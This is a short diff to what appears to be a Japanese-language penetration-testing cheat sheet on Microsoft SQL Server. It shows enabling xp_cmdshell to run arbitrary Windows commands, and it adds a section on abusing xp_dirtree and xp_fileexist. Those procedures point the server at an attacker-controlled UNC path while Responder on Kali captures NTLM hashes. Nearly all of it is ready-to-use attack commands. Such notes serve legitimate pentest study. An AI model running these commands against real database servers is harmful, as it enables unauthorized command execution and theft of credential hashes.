@@ -22,3 +22,13 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXEC xp_cmdshell '<任意のWindowsコマンド>';
 ```
+
+## xp_dirtree, xp_fileexistの悪用
+管理者権限がなくとも、UNCパスを扱う`xp_dirtree`, `xp_fileexist`を使用することでNTLMハッシュの取得が可能。
+```bash
+# kali
+sudo responder -I tun0
+# mssql
+EXEC xp_dirtree '\\<YOUR IP>\<Share>'
+EXEC xp_fileexist '\\<YOUR IP>\<Share>'
+```
